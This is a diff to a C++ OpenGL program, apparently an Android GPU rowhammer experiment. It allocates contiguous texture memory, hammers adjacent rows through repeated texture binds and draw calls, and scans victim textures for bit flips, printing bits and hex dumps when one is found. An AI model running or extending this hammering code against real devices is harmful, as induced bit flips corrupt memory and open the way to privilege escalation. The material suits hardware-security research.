@@ -20,6 +20,24 @@ Shader shader;
 unsigned int framebuffer;
 KGSLEntry cont_entries[64];
 
+//assumes little endian
+void printBits(size_t const size, void const *const ptr)
+{
+  unsigned char *b = (unsigned char *)ptr;
+  unsigned char byte;
+  int i, j;
+
+  for (i = size - 1; i >= 0; i--)
+  {
+    for (j = 7; j >= 0; j--)
+    {
+      byte = (b[i] >> j) & 1;
+      printf("%u", byte);
+    }
+  }
+  puts("");
+}
+
 void init_opengl_setup() {
   shader = Shader(
       "/data/local/tmp/papa/shaders/tr.vs",
@@ -30,7 +48,7 @@ void init_opengl_setup() {
 
 }
 
-void view_texture(unsigned int textureId) {
+void view_texture(unsigned int textureId, int kgsl_index) {
   glBindFramebuffer(GL_FRAMEBUFFER, framebuffer);
   // attach it to currently bound framebuffer object
   glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, textureId, 0);
@@ -42,30 +60,30 @@ void view_texture(unsigned int textureId) {
   // allocate data in memory
   auto *exportData = (unsigned char*)malloc(KB4);
   glReadPixels(0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, GL_RGBA, GL_UNSIGNED_BYTE, exportData);
-
-  // for (int i = 0; i <KB4; i++) {
-  //   if (i % 32 == 0) {
-  //      printf("\n");
-  //    }
-  //    if ( i % 4 == 0 ) {
-  //      printf("  ");
-  //    }
-  //    printf("%x,", exportData[i]);
-  // }
-  // printf("\n");
-
   int flip = 0;
   for (int i = 0; i < KB4; i++)
   {
     if (exportData[i] != 0xff)
     {
-      printf("++++ [%u] BIT FLIP IDENTIFIED [%d]!\n", textureId, i);
-      exit(0);
+      printf("+++ [TextId: %u] BIT FLIP IDENTIFIED [ByteIdx: %d][ByteValue: %x]!\n", textureId, i, exportData[i]);
+      printBits(1, &exportData[i]);
+      print_entries(cont_entries, kgsl_index, 1);
+      // exit(0);
       flip = 1;
+      for (int ii = 0; ii <KB4; ii++) {
+        if (ii % 32 == 0) {
+           printf("\n");
+         }
+         if ( ii % 4 == 0 ) {
+           printf("  ");
+         }
+         printf("%x,", exportData[ii]);
+      }
+      printf("\n");
     }
   }
   if (!flip) {
-    printf("---- [%u] No Flip For You!\n", textureId);
+    // printf("---- [%u] No Flip For You!\n", textureId);
   }
 
   free(exportData);
@@ -195,7 +213,7 @@ void _prepare_hammer_time() {
     // fill textures in row n-1, n+1 with 0
     for (int localOffset = 0; localOffset < 16; localOffset += 2) {
       int offset = row + localOffset;
-      printf("++ Hammering [%d][%d]\n", offset, offset+1);
+      // printf("++ Hammering [%d][%d]\n", offset, offset+1);
 
       fill_texture(cont_entries[offset + 0].texture_id, 0x00);
       fill_texture(cont_entries[offset + 1].texture_id, 0x00);
@@ -243,23 +261,23 @@ void _prepare_hammer_time() {
       // important: bind dummy texture last to prevent last texture error
       bind_texture(cont_entries[15].texture_id, 9, 'D', 15);
 
+      glDrawArrays(GL_POINTS, 0, 1);
+
       // check hammered textures for bit flip
       // printf("+++ Checking [%d][%d]\n", offset + 16, offset + 17);
-      view_texture(cont_entries[offset + 16].texture_id);
-      view_texture(cont_entries[offset + 17].texture_id);
+      view_texture(cont_entries[offset + 16].texture_id, offset+16);
+      view_texture(cont_entries[offset + 17].texture_id, offset+17);
     }
 
   }
 }
 
-void prepare_hammer_time()
-{
+void prepare_hammer_time(){
   for (int i = 0; i < 400000; i++)
   {
     allocate_cont(64, KB4, &cont_entries[0]);
-    print_entries(cont_entries, 0, 4);
+    // print_entries(cont_entries, 0, 4);
     _prepare_hammer_time();
-    glDrawArrays(GL_POINTS, 0, 1);
   }
 }
 
@@ -274,6 +292,9 @@ int main( int argc, char** argv ) {
   // ---------------------- Testing Setups ----------------------
   // Option1) debug shader output with framebuffer
   // init_debug();
+  // allocate_cont(64, KB4, &cont_entries[0]);
+  // print_entries(cont_entries, 0, 4);
+  // _prepare_hammer_time();
   // glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);
   // view_framebuffer();
 
@@ -285,6 +306,9 @@ int main( int argc, char** argv ) {
   // GLuint group_UCHE[]   = {8, 9, 9};
   // GLuint counter_UCHE[] = {0, 1, 2};
   // GLuint num_target_counters = 3;
+  // allocate_cont(64, KB4, &cont_entries[0]);
+  // print_entries(cont_entries, 0, 4);
+  // _prepare_hammer_time();
   // perform_measurement(group_UCHE, counter_UCHE, num_target_counters);
 
 
